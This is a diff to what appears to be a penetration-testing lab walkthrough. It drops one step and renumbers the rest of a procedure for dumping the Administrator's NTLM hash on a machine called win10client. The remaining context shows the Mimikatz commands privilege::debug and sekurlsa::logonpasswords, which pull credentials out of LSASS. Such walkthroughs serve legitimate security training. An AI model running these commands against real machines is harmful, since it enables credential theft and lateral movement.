@@ -1073,8 +1073,7 @@ First, we need to dump the NTLM hash of the Administrator account on `win10clien
 **Command:**
 
 1. Open an elevated command prompt (Run as Administrator).
-2. Navigate to the directory containing `mimikatz.exe`.
-3. Run Mimikatz:
+2. Run Mimikatz:
 
    In **cmd**, use:
 
@@ -1099,13 +1098,13 @@ First, we need to dump the NTLM hash of the Administrator account on `win10clien
       mimikatz #
    ```
 
-4. In the Mimikatz console, enable debug privileges:
+3. In the Mimikatz console, enable debug privileges:
 
    ```bash
    privilege::debug
    ```
 
-5. Dump the credentials from LSASS:
+4. Dump the credentials from LSASS:
 
    ```bash
    sekurlsa::logonpasswords
